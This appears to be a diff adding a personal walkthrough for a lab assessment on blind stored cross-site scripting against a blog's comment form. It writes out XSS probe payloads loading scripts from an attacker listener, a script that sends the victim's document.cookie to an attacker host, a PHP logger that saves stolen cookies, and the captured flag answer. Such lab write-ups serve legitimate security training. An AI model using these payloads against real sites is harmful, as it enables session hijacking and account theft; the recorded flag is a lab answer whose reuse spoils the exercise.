@@ -12,3 +12,32 @@ Apply the skills you learned in this module to achieve the following:
 
 Question 1 -  What is the value of the 'flag' cookie? 
 
+1) http://10.129.2.24/assessment/
+2) on main page we see Note: comments must be approved by an admin, so submitting them may take a few seconds. & if we scroll a bit we see a search text form and a 'welcome to security blog' post -> click this post
+3) http://10.129.2.24/assessment/index.php/2021/06/11/welcome-to-security-blog/ 
+4) now we have a comment name email and website form to test xss scripts in 
+5) open nc listener to see whats vulnerable -> nc -nlvp 4444
+6) '><script src="http://10.10.15.252:4444/comment"></script>
+'><script src="http://10.10.15.252:4444/name"></script>
+'><script src="http://10.10.15.252:4444/email"></script>
+'><script src="http://10.10.15.252:4444/website"></script>
+7) we notice the webiste field is vulnerable as we caught a request on our listener with GET /website HTTP/1.1
+8) write script.js script lol -> new Image().src='http://10.10.15.25.:8080/index.php?c=' + document.cookie;
+9) also write an index.php in same directory as script.js ( i just did /home ) -> 
+
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+10) start a php -S 0.0.0.0:8080 server 
+11) go back to the comment page adn start a new comment with this in the website field ->  '><script src=http://10.10.15.252:8080/script.js></script>
+12) ENSURE ON script.js its the port we are running our PHP server off of -> in this instance it be 8080
+13) output: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1741293731;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
+ 
